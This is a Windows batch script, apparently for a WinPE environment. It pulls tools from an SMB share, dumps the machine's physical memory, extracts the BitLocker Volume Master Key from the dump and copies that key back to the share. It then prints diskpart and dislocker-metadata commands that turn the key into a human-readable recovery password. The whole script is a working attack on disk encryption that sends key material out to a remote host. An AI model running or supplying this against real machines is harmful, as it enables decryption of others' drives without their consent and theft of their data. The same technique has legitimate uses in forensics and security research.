@echo off
setlocal

:: Check if a drive specifying the SMB share is provided
if "%~1"=="" (
	echo Usage: %~nx0 S:
	exit /b 1
)

:: Remove the trailing backslash if present
set "SERVER=%~1"
if "%SERVER:~-1%"=="\" set "SERVER=%SERVER:~0,-1%"

:: Get the current drive letter
set "CURR_DRIVE=%CD:~0,2%"

:: Check if the drive is X:\
if /I "%CURR_DRIVE%"=="X:" (
	echo Error: Current directory is on ramdisk X:\ drive.
	echo Error: Switch to USB drive having enough space to dump complete RAM
	fsutil fsinfo drives
	exit /b 1
)

echo Downloading tools

copy /Y "%SERVER%\winpe\DumpIt.exe" .
copy /Y "%SERVER%\winpe\search-vmk.exe" .
copy /Y "%SERVER%\winpe\dislocker-metadata.exe" .

echo.
echo Dumping physical memory

for /f %%H in ('hostname') do set HOSTNAME=%%H
DumpIt /TYPE RAW /NOCOMPRESS /QUIET /NOLYTICS /OUTPUT "memdump-%HOSTNAME%.bin"

echo.
echo Searching VMK in memory dump

search-vmk.exe "memdump-%HOSTNAME%.bin" "vmk-%HOSTNAME%.dat" || exit /b %ERRORLEVEL%

echo.
echo Uploading VMK
copy "vmk-%HOSTNAME%.dat" "%SERVER%"

echo.
echo Get disk index and partiton offset in bytes:
echo.
echo %cd%^> diskpart
echo diskpart^> list disk
echo diskpart^> select disk 0
echo diskpart^> detail disk
echo diskpart^> list partitions
echo diskpart^> select partition 3
echo diskpart^> detail partition
echo ...
echo Offset in Bytes: 1234
echo ...
echo diskpart^> assign letter=B
echo diskpart^> exit
echo.
echo Get human readable BitLocker recovery password:
echo.
echo dislocker-metadata -K vmk-%HOSTNAME%.dat -V \\.\PhysicalDrive0 -o $OFFSET
